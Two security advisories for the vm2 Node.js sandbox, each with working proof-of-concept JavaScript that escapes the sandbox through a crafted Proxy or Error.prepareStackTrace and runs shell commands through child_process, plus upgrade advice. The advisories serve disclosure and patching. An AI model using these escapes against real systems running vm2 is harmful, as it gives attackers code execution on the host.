## Overview
[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.

Affected versions of this package are vulnerable to Sandbox Bypass by abusing an unexpected creation of a host object based on the maliciously crafted specification of `Proxy`.
Exploiting this vulnerability allows an attacker to gain remote code execution rights on the host running the sandbox via the `Function` constructor.
## PoC
```js
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo hacked").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```
## Remediation
Upgrade `vm2` to version 3.9.18 or higher.
## References
- [GitHub Commit](https://github.com/patriksimek/vm2/commit/d88105f99752305c5b8a77b63ddee3ec86912daf)
- [GitHub Gist](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- [GitHub Release](https://github.com/patriksimek/vm2/releases/tag/3.9.18)

## Overview
[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.

Affected versions of this package are vulnerable to Sandbox Escape due to improper handling of host objects passed to `Error.prepareStackTrace` in case of unhandled async errors.
## PoC
```js
const {VM} = require("vm2");
let vmInstance = new VM();

const code = `
Error.prepareStackTrace = (e, frames) => {
    frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag'); 
};
(async ()=>{}).constructor('return process')()
`

vmInstance.run(code);
```
## Remediation
Upgrade `vm2` to version 3.9.15 or higher.
